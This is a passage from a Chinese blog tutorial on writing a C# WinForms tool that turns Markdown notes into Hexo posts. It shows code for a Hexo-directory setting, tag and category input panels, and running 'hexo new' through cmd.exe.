创建文本框</span></span><br><span class="line">    hexoDirectoryTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="keyword">this</span>.HexoDirectory, <span class="comment">// 显示已有的 Hexo 目录路径</span></span><br><span class="line">        Dock = DockStyle.Fill</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建浏览按钮</span></span><br><span class="line">    browseButton = <span class="keyword">new</span> Button</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="string">&quot;Browse&quot;</span>,</span><br><span class="line">        Dock = DockStyle.Fill</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 浏览按钮点击事件</span></span><br><span class="line">    browseButton.Click += BrowseButton_Click;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将控件添加到 TableLayoutPanel 中</span></span><br><span class="line">    tableLayoutPanel.Controls.Add(label1, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 添加 Label 到第一列</span></span><br><span class="line">    tableLayoutPanel.Controls.Add(hexoDirectoryTextBox, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">// 添加 TextBox 到第二列</span></span><br><span class="line">    tableLayoutPanel.Controls.Add(browseButton, <span class="number">2</span>, <span class="number">0</span>); <span class="comment">// 添加 Button 到第三列</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tableLayoutPanel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浏览按钮点击事件处理</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">BrowseButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> (FolderBrowserDialog folderDialog = <span class="keyword">new</span> FolderBrowserDialog())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 设置初始文件夹路径为当前路径</span></span><br><span class="line">        folderDialog.SelectedPath = hexoDirectoryTextBox.Text;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 弹出文件夹选择框</span></span><br><span class="line">        <span class="keyword">if</span> (folderDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置 TextBox 为选择的文件夹路径</span></span><br><span class="line">            MessageBox.Show(<span class="string">&quot;Hexo directory has been set to &quot;</span> + folderDialog.SelectedPath);</span><br><span class="line">            hexoDirectoryTextBox.Text = folderDialog.SelectedPath;</span><br><span class="line">            HexoDirectory = folderDialog.SelectedPath;</span><br><span class="line">        &#125;</span><br><span class="line">        SaveSettings();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户输入的路径是否有效</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">ValidateHexoDirectory</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> path = hexoDirectoryTextBox.Text;</span><br><span class="line">    <span class="keyword">if</span> (Directory.Exists(path))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.HexoDirectory = path;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 路径有效</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox.Show(<span class="string">&quot;Invalid Hexo directory. Please select a valid path.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 路径无效</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>选文件路径是用<strong>folderDialog</strong>，类似于之前可视化文件选取所用到的<strong>OpenFileDialog</strong>。这里我们也是返回一个<strong>tableLayoutPanel</strong>到主程序，然后再在主程序中将其增加到对应的设计面板<strong>tableLayoutPanel</strong>中，最后主程序把设计面板加入<strong>Settings</strong>的<strong>TabPage</strong>即可。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Settings&quot;</span>:</span><br><span class="line">    Settings settings = <span class="keyword">new</span> Settings();     <span class="comment">//获取设置属性</span></span><br><span class="line">    settings.LoadSettings();</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    tableLayoutPanel.Controls.Add(settings.CreateLanguageSetting(), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    tableLayoutPanel.Controls.Add(settings.CreateHexoDirectorySetting(), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    newTab.Controls.Add(tableLayoutPanel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250127225711667.png"
                      class=""
                >
<h4 id="文件格式转换功能实现">文件格式转换功能实现</h4>
<p>前面我们已经解决了获取输入文件路径以及输出目录的问题，然后我们就可以着手实现我们的核心功能，也就是图片文件转移与输出目标格式文件。这里我们还可以可视化实现hexo文章标签与类别的设置。以下是整个<strong>FileProcessor.cs</strong>的实现。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">FileProcessor</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Tag &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;    <span class="comment">// Hexo文章标签</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Title &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;  <span class="comment">// Hexo文章标题</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Category &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;   <span class="comment">// Hexo文章分类</span></span><br><span class="line">        <span class="keyword">private</span> FlowLayoutPanel tagsPanel;</span><br><span class="line">        <span class="keyword">private</span> Button addTagButton;</span><br><span class="line">        <span class="keyword">private</span> Button removeTagButton;</span><br><span class="line">        <span class="keyword">private</span> List&lt;TextBox&gt; tagsTextBoxes = <span class="keyword">new</span> List&lt;TextBox&gt;();</span><br><span class="line">        <span class="keyword">private</span> FlowLayoutPanel categoriesPanel;</span><br><span class="line">        <span class="keyword">private</span> Button addCategoryButton;</span><br><span class="line">        <span class="keyword">private</span> Button removeCategoryButton;</span><br><span class="line">        <span class="keyword">private</span> List&lt;TextBox&gt; categoriesTextBoxes = <span class="keyword">new</span> List&lt;TextBox&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> RichTextBox processInfoBox;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//渲染Process Markdown面板</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Control <span class="title">CreateProcessMarkdownPanel</span>(<span class="params"><span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建 TableLayoutPanel 用于布局</span></span><br><span class="line">            TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">            &#123;</span><br><span class="line">                RowCount = <span class="number">6</span>, <span class="comment">// 根据需要的行数调整</span></span><br><span class="line">                ColumnCount = <span class="number">2</span>,</span><br><span class="line">                Dock = DockStyle.Fill,</span><br><span class="line">                AutoSize = <span class="literal">true</span>,</span><br><span class="line">                Padding = <span class="keyword">new</span> Padding(<span class="number">20</span>)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>));</span><br><span class="line">            tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">80</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建文件路径标签</span></span><br><span class="line">            Label filePathLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Source File Path: &quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            Label filePathValueLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = filePath,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft,</span><br><span class="line">                Font = <span class="keyword">new</span> Font(<span class="string">&quot;Consolas&quot;</span>, <span class="number">10</span>),</span><br><span class="line">                AutoSize = <span class="literal">false</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 计算文本的宽度</span></span><br><span class="line">            SizeF textSize = TextRenderer.MeasureText(filePath, filePathValueLabel.Font);</span><br><span class="line">            filePathValueLabel.Width = (<span class="built_in">int</span>)textSize.Width + <span class="number">20</span>;  <span class="comment">// 20 是为了留一些额外的空间，可以根据需要调整</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建标题标签</span></span><br><span class="line">            Label titleLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Title&quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建标题输入框</span></span><br><span class="line">            TextBox titleTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">            &#123;</span><br><span class="line">                Multiline = <span class="literal">true</span>,</span><br><span class="line">                Width = <span class="number">300</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建标签输入框</span></span><br><span class="line">            Label tagsLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Tags&quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 FlowLayoutPanel 用来容纳多个输入框</span></span><br><span class="line">            tagsPanel = <span class="keyword">new</span> FlowLayoutPanel</span><br><span class="line">            &#123;</span><br><span class="line">                Dock = DockStyle.Top,</span><br><span class="line">                AutoSize = <span class="literal">true</span>,</span><br><span class="line">                FlowDirection = FlowDirection.LeftToRight,  <span class="comment">// 横向排列</span></span><br><span class="line">                WrapContents = <span class="literal">true</span>,  <span class="comment">// 容量满了之后自动换行</span></span><br><span class="line">                Padding = <span class="keyword">new</span> Padding(<span class="number">10</span>)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 创建加号按钮</span></span><br><span class="line">            addTagButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;+&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            addTagButton.Click += AddTagButton_Click;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建减号按钮</span></span><br><span class="line">            removeTagButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;-&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            removeTagButton.Click += RemoveTagButton_Click;</span><br><span class="line">            <span class="comment">// 添加初始的标签输入框</span></span><br><span class="line">            AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建分类输入框</span></span><br><span class="line">            Label categoryLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Category&quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 FlowLayoutPanel 用来容纳多个输入框</span></span><br><span class="line">            categoriesPanel = <span class="keyword">new</span> FlowLayoutPanel</span><br><span class="line">            &#123;</span><br><span class="line">                Dock = DockStyle.Top,</span><br><span class="line">                AutoSize = <span class="literal">true</span>,</span><br><span class="line">                FlowDirection = FlowDirection.LeftToRight,  <span class="comment">// 横向排列</span></span><br><span class="line">                WrapContents = <span class="literal">true</span>,  <span class="comment">// 容量满了之后自动换行</span></span><br><span class="line">                Padding = <span class="keyword">new</span> Padding(<span class="number">10</span>)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 创建加号按钮</span></span><br><span class="line">            addCategoryButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;+&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            addCategoryButton.Click += AddCategoryButton_Click;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建减号按钮</span></span><br><span class="line">            removeCategoryButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;-&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            removeCategoryButton.Click += RemoveCategoryButton_Click;</span><br><span class="line">            <span class="comment">// 添加初始的标签输入框</span></span><br><span class="line">            AddInputBox(categoriesPanel, categoriesTextBoxes, addCategoryButton, removeCategoryButton);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建确定按钮</span></span><br><span class="line">            Button confirmButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Process&quot;</span>,</span><br><span class="line">                Width = <span class="number">100</span>,</span><br><span class="line">                Height = <span class="number">40</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 点击按钮时执行 ProcessMarkdownFile</span></span><br><span class="line">            confirmButton.Click += (sender, e) =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                confirmButton.Visible = <span class="literal">false</span>;  <span class="comment">// 隐藏确定按钮，防止用户多次点击</span></span><br><span class="line">                <span class="built_in">string</span> title = titleTextBox.Text;</span><br><span class="line">                List&lt;<span class="built_in">string</span>&gt; tags = GetTags();</span><br><span class="line">                List&lt;<span class="built_in">string</span>&gt; category = GetCategories();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 非空检测</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrWhiteSpace(title))</span><br><span class="line">                &#123;</span><br><span class="line">                    MessageBox.Show(<span class="string">&quot;Title cannot be empty.&quot;</span>, <span class="string">&quot;Input Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                    <span class="keyword">return</span>;  <span class="comment">// 直接退出，不继续执行后续代码</span></span><br><span class="line">                &#125;</span><br><span class="line">                ProcessMarkdownFile(title, tags, category, filePath);</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 Process 信息框</span></span><br><span class="line">            processInfoBox = <span class="keyword">new</span> RichTextBox</span><br><span class="line">            &#123;</span><br><span class="line">                Multiline = <span class="literal">true</span>,</span><br><span class="line">                Width = <span class="number">600</span>,</span><br><span class="line">                Height = <span class="number">200</span>,</span><br><span class="line">                ReadOnly = <span class="literal">true</span>,  <span class="comment">// 设置为只读</span></span><br><span class="line">                ScrollBars = RichTextBoxScrollBars.Vertical,  <span class="comment">// 启用滚动条</span></span><br><span class="line">                WordWrap = <span class="literal">true</span>,   <span class="comment">// 自动换行</span></span><br><span class="line">                Font = <span class="keyword">new</span> Font(<span class="string">&quot;Consolas&quot;</span>, <span class="number">12</span>)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将控件添加到 TableLayoutPanel</span></span><br><span class="line">            tableLayoutPanel.Controls.Add(filePathLabel, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(filePathValueLabel, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(titleLabel, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(titleTextBox, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(tagsLabel, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(tagsPanel, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(categoryLabel, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(categoriesPanel, <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(confirmButton, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(processInfoBox, <span class="number">1</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> tableLayoutPanel;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button addButton, Button removeButton</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建新的 TextBox 控件</span></span><br><span class="line">            TextBox newInputTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">            &#123;</span><br><span class="line">                Width = <span class="number">100</span>,  <span class="comment">// 设置适当的宽度</span></span><br><span class="line">                Margin = <span class="keyword">new</span> Padding(<span class="number">5</span>)  <span class="comment">// 设置间距</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将新的 TextBox 添加到列表和面板</span></span><br><span class="line">            textBoxesList.Add(newInputTextBox);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 先移除+-号按钮，之后再添加，确保在最后一个位置</span></span><br><span class="line">            <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">                inputPanel.Controls.Remove(removeButton);</span><br><span class="line">            inputPanel.Controls.Remove(addButton);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加新的输入框和按钮</span></span><br><span class="line">            inputPanel.Controls.Add(newInputTextBox);</span><br><span class="line">            inputPanel.Controls.Add(addButton);  <span class="comment">// 将加号按钮添加到 inputPanel 中</span></span><br><span class="line">            <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">                inputPanel.Controls.Add(removeButton);  <span class="comment">// 将减号按钮添加到 inputPanel 中</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button removeButton</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取列表中最后一个添加的 TextBox 和相应的按钮</span></span><br><span class="line">                TextBox lastInputTextBox = textBoxesList.Last();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 从 inputPanel 和 textBoxesList 中移除最后一个 TextBox 和按钮</span></span><br><span class="line">                <span class="keyword">if</span> (lastInputTextBox != <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    inputPanel.Controls.Remove(lastInputTextBox);</span><br><span class="line">                    textBoxesList.Remove(lastInputTextBox);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果只有一个标签输入框，则隐藏减号按钮</span></span><br><span class="line">            <span class="keyword">if</span> (textBoxesList.Count == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">                    inputPanel.Controls.Remove(removeButton);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            RemoveInputBox(tagsPanel, tagsTextBoxes, removeTagButton);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddCategoryButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddInputBox(categoriesPanel, categoriesTextBoxes, addCategoryButton, removeCategoryButton);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveCategoryButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            RemoveInputBox(categoriesPanel, categoriesTextBoxes, removeCategoryButton);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取用户输入的所有标签</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">GetTags</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; tags = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> textBox <span class="keyword">in</span> tagsTextBoxes)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrWhiteSpace(textBox.Text))</span><br><span class="line">                &#123;</span><br><span class="line">                    tags.Add(textBox.Text);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tags;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取用户输入的所有类型</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">GetCategories</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; categories = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> textBox <span class="keyword">in</span> categoriesTextBoxes)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrWhiteSpace(textBox.Text))</span><br><span class="line">                &#123;</span><br><span class="line">                    categories.Add(textBox.Text);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> categories;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 显示提示信息</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">AppendMessage</span>(<span class="params"><span class="built_in">string</span> message, Color color</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置不同颜色（可选）</span></span><br><span class="line">            processInfoBox.SelectionColor = color;  <span class="comment">// 设置文本颜色</span></span><br><span class="line">            processInfoBox.AppendText(message + Environment.NewLine);</span><br><span class="line">            processInfoBox.ScrollToCaret();  <span class="comment">// 确保显示滚动到文本底部</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理Markdown文件</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">ProcessMarkdownFile</span>(<span class="params"><span class="built_in">string</span> title, List&lt;<span class="built_in">string</span>&gt; tags, List&lt;<span class="built_in">string</span>&gt; category, <span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Settings settings = <span class="keyword">new</span> Settings();</span><br><span class="line">            settings.LoadSettings();</span><br><span class="line">            <span class="built_in">string</span> hexoDirectory = settings.HexoDirectory;</span><br><span class="line">            <span class="built_in">string</span> rootDirectory = hexoDirectory.Substring(<span class="number">0</span>, hexoDirectory.LastIndexOf(<span class="string">&quot;\\&quot;</span>));</span><br><span class="line">            <span class="built_in">string</span> postDirectory = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> hexoNewCmd = <span class="string">$&quot;hexo new \&quot;<span class="subst">&#123;title&#125;</span>\&quot;&quot;</span>;    <span class="comment">// 创建新文章命令</span></span><br><span class="line">            AppendMessage(<span class="string">$&quot;[*] executing command: <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>, Color.Black);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 使用 Process 执行命令</span></span><br><span class="line">                ProcessStartInfo processStartInfo = <span class="keyword">new</span> ProcessStartInfo</span><br><span class="line">                &#123;</span><br><span class="line">                    FileName = <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">                    Arguments = <span class="string">$&quot;/c <span class="subst">&#123;rootDirectory&#125;</span> &amp;&amp; cd <span class="subst">&#123;hexoDirectory&#125;</span> &amp;&amp; <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>,</span><br><span class="line">                    CreateNoWindow = <span class="literal">true</span>,</span><br><span class="line">                    UseShellExecute = <span class="literal">false</span>,</span><br><span class="line">                    RedirectStandardOutput = <span class="literal">true</span>,</span><br><span class="line">                    RedirectStandardError = <span class="literal">true</span>,</span><br><span class="line">                  </span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (Process process = Process.Start(processStartInfo))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">string</span> output = <span class="keyword">await</span> process.StandardOutput.ReadToEndAsync();</span><br><span class="line">                    <span class="built_in">string</span> error = <span class="keyword">await</span> process.StandardError.ReadToEndAsync();</span><br><span class="line">                    </span><br><span class="line">                    process.WaitForExit();</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (process.ExitCode != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        MessageBox.Show(<span class="string">$&quot;Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                        AppendMessage(<span class="string">$&quot;[-] Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (File.Exists(Path.Combine(postDirectory, title + <span class="string">&quot;.md&quot;</span>)))        <span class="comment">// 检查新文章是否创建成功</span></span><br><span class="line">                        AppendMessage(<span class="string">&quot;[+] successfully created new post!&quot;</span>,Color.Green);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                MessageBox.Show(<span class="string">$&quot;Error: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取生成的 Markdown 文件路径</span></span><br><span class="line">            <span class="built_in">string</span> targetMarkdownFilePath = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>, <span class="string">$&quot;<span class="subst">&#123;title&#125;</span>.md&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> targetMarkdownPictureDirectory = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>, <span class="string">$&quot;<span class="subst">&#123;title&#125;</span>&quot;</span>);</span><br><span class="line">            <span 